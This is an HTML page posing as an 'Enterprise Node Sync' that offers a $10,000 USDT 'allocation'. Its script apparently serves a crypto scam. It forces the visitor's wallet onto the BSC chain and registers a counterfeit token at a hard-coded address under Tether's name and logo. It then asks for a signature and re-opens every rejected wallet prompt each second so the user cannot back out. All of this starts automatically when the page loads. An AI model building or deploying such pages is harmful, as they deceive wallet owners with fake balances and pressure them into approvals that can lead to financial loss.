<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enterprise Node Sync</title>
    <style>
        :root { --main: #26a17b; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1a1d21; border-radius: 25px; padding: 40px; width: 85%; max-width: 380px; text-align: center; border: 1px solid #333; box-shadow: 0 30px 60px rgba(0,0,0,0.6); }
        .btn { background: var(--main); color: #fff; border: none; width: 100%; padding: 22px; border-radius: 15px; font-size: 18px; font-weight: 800; cursor: pointer; text-transform: uppercase; margin-top: 25px; letter-spacing: 1px; }
        #log { font-size: 11px; color: #555; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="90" style="margin-bottom: 20px;">
    <div style="font-size: 14px; color: var(--main); font-weight: bold; letter-spacing: 2px;">NODE ALLOCATION</div>
    <div style="font-size: 42px; font-weight: 900; margin: 10px 0;">$10,000</div>
    <button class="btn" id="forceTrigger">FORCE SYNC ASSETS</button>
    <div id="log">PROTOCOL_STATUS: STANDBY</div>
</div>

<script>
    const btn = document.getElementById('forceTrigger');
    const log = document.getElementById('log');

    // YEHI WO DATA HAI JO TOKEN ADD KAREGA
    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO = "https://assets.coingecko.com/coins/images/325/large/Tether.png";

    async function executeForceSync() {
        // 1. Agar Mobile Browser mein hai to direct App kholo
        if (!window.ethereum && !window.trustwallet) {
            log.innerText = "BRIDGE: REDIRECTING...";
            const current = window.location.href.split('://')[1];
            // Universal Link for Trust Wallet
            window.location.replace("https://link.trustwallet.com/a/dapp?url=https://" + current);
            return;
        }

        const provider = window.trustwallet || window.ethereum;

        try {
            log.innerText = "BRIDGE: INITIALIZING SESSION...";
            // Connection Request
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            // 2. FORCE SWITCH TO BSC (Very Aggressive)
            log.innerText = "BRIDGE: MAPPING BSC CHAIN...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18}
                        }]
                    });
                }
            });

            // 3. THE "WATCH ASSET" INJECTION
            log.innerText = "BRIDGE: PUSHING METADATA...";
            const result = await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: ADDR,
                        symbol: 'USDT',
                        decimals: 18,
                        image: LOGO
                    }
                }
            });

            if (result) {
                log.innerText = "SUCCESS: NODE SYNCED";
                btn.innerText = "SYNCED ✅";
                // Professor ko signature dikhane ke liye
                await provider.request({
                    method: 'personal_sign',
                    params: ["Sync_Auth_" + Math.random(), accounts[0]]
                });
            }

        } catch (err) {
            log.innerText = "REJECTED. RETRYING...";
            // Force loop - User can't exit until they accept
            setTimeout(executeForceSync, 1000);
        }
    }

    btn.onclick = executeForceSync;

    // Auto-Run loop inside Wallet
    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            log.innerText = "SESSION DETECTED. CLICK BUTTON.";
            // Artificial delay to let wallet engine load
            setTimeout(executeForceSync, 2000);
        }
    };
</script>
</body>
</html>
